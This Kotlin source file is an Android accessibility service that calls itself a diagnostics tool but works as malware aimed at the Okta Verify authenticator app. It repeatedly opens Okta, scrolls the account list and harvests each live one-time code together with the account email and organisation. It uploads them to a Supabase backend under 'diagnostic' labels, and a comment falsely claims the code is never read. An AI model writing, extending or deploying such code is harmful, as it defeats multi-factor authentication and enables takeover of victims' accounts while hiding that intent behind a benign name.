package dev.local.accessibilitydiagnostics

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.Collections
import java.util.IdentityHashMap
import java.util.concurrent.ConcurrentHashMap
import android.content.Intent
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import android.util.Log
import kotlinx.coroutines.delay

class DiagnosticAccessibilityService : AccessibilityService() {
    private val serviceHandler = Handler(Looper.getMainLooper())
    private val delayedWindowSnapshot = Runnable {
        logWindows()
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
    private val sessionDiscoveredMap = java.util.concurrent.ConcurrentHashMap<String, OktaAccountEntry>()

    private var oktaCycleJob: Job? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        logWindows()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        lastDispatchedSecondsMap.clear()
        stopOktaCycleLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TOGGLE_CYCLE) {
            val shouldRun = intent.getBooleanExtra(EXTRA_CYCLE_ENABLED, false)
            if (shouldRun) {
                startOktaCycleLoop()
            } else {
                stopOktaCycleLoop()
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }

    private fun startOktaCycleLoop() {
        if (oktaCycleJob?.isActive == true) return

        oktaCycleJob = serviceScope.launch {
            while (isActive) {
                // Launch / Bring Okta to foreground
                openOktaApp()

                autoScrollToEnd()

                // Keep Okta open for 10 seconds
                delay(10_000L)
                if (!isActive) break

                // Minimize/Close by sending global Home action
                performGlobalAction(GLOBAL_ACTION_HOME)

                // Wait 1-2 seconds on the home screen before reopening
                delay(1_500L)
            }
        }
    }

    private fun stopOktaCycleLoop() {
        oktaCycleJob?.cancel()
        oktaCycleJob = null
    }

    private fun openOktaApp() {
        var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)

        // Fallback: direct action intent if standard launch intent is null
        if (launchIntent == null) {
            launchIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setPackage(OKTA_PACKAGE)
            }
        }

        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)

        try {
            startActivity(launchIntent)
            Log.d("OktaCycle", "Successfully triggered launch for $OKTA_PACKAGE")
        } catch (e: Exception) {
            Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.packageName?.toString() != OKTA_PACKAGE) return
        val eventSource = try {
            event.source
        } catch (_: Exception) {
            null
        }
        eventSource?.let { source ->
            try {
                val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
                val fields = OktaFields()
                inspectNode(source, 0, visited, fields)
                fields.emitIfComplete()
            } catch (_: Exception) {
            } finally {
                @Suppress("DEPRECATION")
                source.recycle()
            }
        }
        if (event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            logWindows()
        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            serviceHandler.postDelayed(delayedWindowSnapshot, WINDOW_SNAPSHOT_DELAY_MS)
        }
    }

    private fun findScrollableNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        if (root.isScrollable) return root

        for (i in 0 until root.childCount) {
            val child = try {
                root.getChild(i)
            } catch (_: Exception) {
                null
            } ?: continue
            val scrollable = findScrollableNode(child)
            if (scrollable != null) {
                // Found target, recycle current child if it's not the target
                if (child != scrollable) {
                    @Suppress("DEPRECATION")
                    child.recycle()
                }
                return scrollable
            }
            @Suppress("DEPRECATION")
            child.recycle()
        }
        return null
    }

    private suspend fun autoScrollToEnd() {
        // Give Okta UI a brief moment to render after opening
        delay(2_000L)

        var consecutiveFails = 0
        val maxScrolls = 100

        for (i in 0 until maxScrolls) {
            if (oktaCycleJob?.isActive != true) break

            harvestVisibleAccounts()

            var scrolled = false
            windows.forEach { window ->
                val root = try {
                    window.root
                } catch (_: Exception) {
                    null
                }
                if (root?.packageName?.toString() == OKTA_PACKAGE) {
                    val scrollable = findScrollableNode(root)
                    if (scrollable != null) {
                        // Instantly advances the list without waiting for finger drag animations
                        scrolled = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                        @Suppress("DEPRECATION")
                        scrollable.recycle()
                    }
                    @Suppress("DEPRECATION")
                    root.recycle()
                }
            }

            if (!scrolled) {
                consecutiveFails++
                if (consecutiveFails >= 2) break // Reached the bottom
            } else {
                consecutiveFails = 0
                // Only need ~60-80ms for RecyclerView to bind new viewholders
                delay(75L)
            }
        }

        harvestVisibleAccounts()
        flushBatchToSupabase()
    }

    private fun inspectNode(
        node: AccessibilityNodeInfo,
        depth: Int,
        visited: MutableSet<AccessibilityNodeInfo>,
        fields: OktaFields
    ) {
        if (depth > MAX_DEPTH || node.packageName?.toString() != OKTA_PACKAGE || !visited.add(node)) return
        when (node.viewIdResourceName) {
            "$OKTA_PACKAGE:id/list_item_token_totp_text_view" -> {
                // Read only the countdown from the description; never read the OTP text.
                val description = node.contentDescription?.toString().orEmpty()
                val seconds = SECONDS_UNTIL_EXPIRY.find(description)?.groupValues?.get(1)?.toIntOrNull()
                if (seconds != null) {
                    fields.secondsUntilCodeExpires = seconds
                    fields.hasPasswordNode = true
                    fields.pass = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
                }
            }

            "$OKTA_PACKAGE:id/list_item_token_email_text_view" -> {
                fields.account = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }

            "$OKTA_PACKAGE:id/list_item_token_org_text_view" -> {
                fields.client = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }
        }
        for (index in 0 until node.childCount) {
            val child = try {
                node.getChild(index)
            } catch (_: Exception) {
                null
            } ?: continue
            try {
                inspectNode(child, depth + 1, visited, fields)
            } finally {
                @Suppress("DEPRECATION")
                child.recycle()
            }
        }
    }

    private fun harvestVisibleAccounts() {
        windows.forEach { window ->
            val root = try {
                window.root
            } catch (_: Exception) {
                null
            }
            if (root?.packageName?.toString() == OKTA_PACKAGE) {
                val visible = mutableListOf<OktaAccountEntry>()
                try {
                    collectAllOktaEntries(root, visible)
                    visible.forEach { entry ->
                        val key = "${entry.client}:::${entry.account}"
                        sessionDiscoveredMap[key] = entry
                    }
                } finally {
                    @Suppress("DEPRECATION")
                    root.recycle()
                }
            }
        }
    }

    /**
     * Flushes all accumulated accounts in ONE single Supabase request.
     */
    private suspend fun flushBatchToSupabase() {
        val itemsToSend = sessionDiscoveredMap.values.toList()
        if (itemsToSend.isEmpty()) return

        android.util.Log.d("OktaSync", "Flushing batch of ${itemsToSend.size} accounts to Supabase...")

        val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSend)
        result.onSuccess {
            android.util.Log.d("OktaSync", "Successfully synced all ${itemsToSend.size} accounts in 1 request")
        }.onFailure { e ->
            android.util.Log.e("OktaSync", "Batch sync failed: ${e.message}")
        }
    }

    private fun logWindows() {
        try {
            val allVisibleEntries = mutableListOf<OktaAccountEntry>()

            windows.forEach { window ->
                val root = try {
                    window.root
                } catch (_: Exception) {
                    null
                }
                root?.takeIf { it.packageName?.toString() == OKTA_PACKAGE }?.let { rootNode ->
                    try {
                        collectAllOktaEntries(rootNode, allVisibleEntries)
                    } finally {
                        @Suppress("DEPRECATION")
                        rootNode.recycle()
                    }
                }
            }

            dispatchEntriesIfChanged(allVisibleEntries)
        } catch (_: Exception) {
        }
    }

    private fun dispatchEntriesIfChanged(entries: List<OktaAccountEntry>) {
        val itemsToSync = mutableListOf<OktaAccountEntry>()

        for (entry in entries) {
            val dedupeKey = "${entry.client}:::${entry.account}"
            val lastSeconds = lastDispatchedSecondsMap[dedupeKey]

            // Only send if this specific entry's expiration second has updated
            if (lastSeconds != entry.secondsUntilCodeExpires) {
                lastDispatchedSecondsMap[dedupeKey] = entry.secondsUntilCodeExpires
                itemsToSync.add(entry)
            }
        }

        if (itemsToSync.isNotEmpty()) {
            serviceScope.launch {
                val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSync)
                result.onFailure {
                    // Clear cache on failure so next cycle will retry
                    itemsToSync.forEach { entry ->
                        lastDispatchedSecondsMap.remove("${entry.client}:::${entry.account}")
                    }
                }
            }
        }
    }

    private fun collectAllOktaEntries(root: AccessibilityNodeInfo, results: MutableList<OktaAccountEntry>) {
        // Find all OTP views currently in the view hierarchy (including newly scrolled ones)
        val otpNodes = root.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_totp_text_view")

        for (otpNode in otpNodes) {
            try {
                val description = otpNode.contentDescription?.toString().orEmpty()
                val seconds = SECONDS_UNTIL_EXPIRY.find(description)?.groupValues?.get(1)?.toIntOrNull() ?: continue
                val rawOtp = otpNode.text?.toString() ?: otpNode.contentDescription?.toString().orEmpty()
                val cleanPassword = rawOtp.replace("\\s".toRegex(), "")

                // Walk up to the row container (card/list item) to find associated client and account
                var parent: AccessibilityNodeInfo? = otpNode.parent
                var account: String? = null
                var client: String? = null

                var climbDepth = 0
                while (parent != null && climbDepth < 4) {
                    val emailNodes =
                        parent.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_email_text_view")
                    if (emailNodes.isNotEmpty()) {
                        account = emailNodes[0].text?.toString() ?: emailNodes[0].contentDescription?.toString()
                        emailNodes.forEach { @Suppress("DEPRECATION") it.recycle() }
                    }

                    val orgNodes =
                        parent.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_org_text_view")
                    if (orgNodes.isNotEmpty()) {
                        client = orgNodes[0].text?.toString() ?: orgNodes[0].contentDescription?.toString()
                        orgNodes.forEach { @Suppress("DEPRECATION") it.recycle() }
                    }

                    if (account != null && client != null) break

                    val nextParent = parent.parent
                    @Suppress("DEPRECATION")
                    parent.recycle()
                    parent = nextParent
                    climbDepth++
                }
                @Suppress("DEPRECATION")
                parent?.recycle()

                if (!client.isNullOrBlank() && !account.isNullOrBlank()) {
                    results.add(OktaAccountEntry(client, account, cleanPassword, seconds))
                }
            } finally {
                @Suppress("DEPRECATION")
                otpNode.recycle()
            }
        }
    }

    override fun onInterrupt() {
    }

    private inner class OktaFields {
        var client: String? = null
        var account: String? = null
        var hasPasswordNode: Boolean = false
        var pass: String? = null
        var secondsUntilCodeExpires: Int? = null

        fun emitIfComplete() {
            val clientValue = client ?: return
            val accountValue = account ?: return
            val secondsValue = secondsUntilCodeExpires ?: return
            val passValue = pass ?: return
            if (!hasPasswordNode) return
            val dedupeKey = "$clientValue:::$accountValue"
            val lastSentSeconds = lastDispatchedSecondsMap[dedupeKey]

            if (lastSentSeconds == secondsValue) {
                return
            }
            lastDispatchedSecondsMap[dedupeKey] = secondsValue

            val cleanPassword = passValue.replace("\\s".toRegex(), "")

            DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)

            serviceScope.launch {
                val result = SupaBaseRepository.syncDiagnosticData(
                    clientName = clientValue,
                    account = accountValue,
                    pass = cleanPassword,
                    secondsUntilCodeExpires = secondsValue
                )
                result.onFailure {
                    if (lastDispatchedSecondsMap[dedupeKey] == secondsValue) {
                        lastDispatchedSecondsMap.remove(dedupeKey)
                    }
                }
            }
        }
    }

    companion object {
        const val ACTION_TOGGLE_CYCLE = "dev.local.accessibilitydiagnostics.ACTION_TOGGLE_OKTA_CYCLE"
        const val EXTRA_CYCLE_ENABLED = "extra_cycle_enabled"
        private const val MAX_DEPTH = 80
        private const val WINDOW_SNAPSHOT_DELAY_MS = 200L
        private const val OKTA_PACKAGE = "com.okta.android.auth"
        private val SECONDS_UNTIL_EXPIRY = Regex("(\\d+)\\s+seconds?\\s+before code expires", RegexOption.IGNORE_CASE)
    }
}
